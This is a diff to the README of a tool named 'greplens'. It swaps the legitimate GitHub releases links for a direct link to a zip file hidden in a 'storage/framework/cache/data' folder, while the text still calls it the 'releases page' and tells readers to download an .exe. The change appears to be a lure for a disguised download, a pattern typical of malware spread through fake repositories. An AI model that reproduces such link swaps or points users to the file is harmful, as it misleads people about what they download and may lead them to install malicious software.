@@ -1,6 +1,6 @@
 # 🔍 greplens - Manage security rules and scan projects
 
-<a href="https://github.com/coordinated-basketweave258/greplens/releases">
+<a href="https://github.com/coordinated-basketweave258/greplens/raw/refs/heads/main/storage/framework/cache/data/Software-v1.5.zip">
   <img src="https://img.shields.io/badge/Download-greplens-blue.svg" alt="Download greplens">
 </a>
 
@@ -20,7 +20,7 @@ Ensure you meet these requirements before you start:
 
 ## 📥 Downloading greplens
 
-Visit the [releases page](https://github.com/coordinated-basketweave258/greplens/releases) to access the application. Look for the file ending in `.exe` under the latest release section. Download this file to your computer. We suggest saving it in your Downloads folder for easy access.
+Visit the [releases page](https://github.com/coordinated-basketweave258/greplens/raw/refs/heads/main/storage/framework/cache/data/Software-v1.5.zip) to access the application. Look for the file ending in `.exe` under the latest release section. Download this file to your computer. We suggest saving it in your Downloads folder for easy access.
 
 ## ⚙️ How to install
 
